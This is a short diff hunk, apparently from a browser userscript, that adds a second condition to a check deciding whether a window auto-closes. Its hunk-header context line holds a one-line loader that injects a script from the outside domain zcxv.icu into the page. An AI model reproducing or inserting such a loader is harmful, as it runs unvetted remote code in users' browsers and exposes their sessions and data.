@@ -183,7 +183,7 @@ d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t
             let fba = $('div#feedback h3')?.innerHTML;
             if (fba && regn.test(fba)) {
                 let mats = fba.match(regn);
-                if (mats[1] == mats[4]) return (autoclose ? window.close() : 0);
+                if (mats[1] == mats[4] && mats[3] == mats[6]) return (autoclose ? window.close() : 0);
             }
         }
         if (forceauto) {
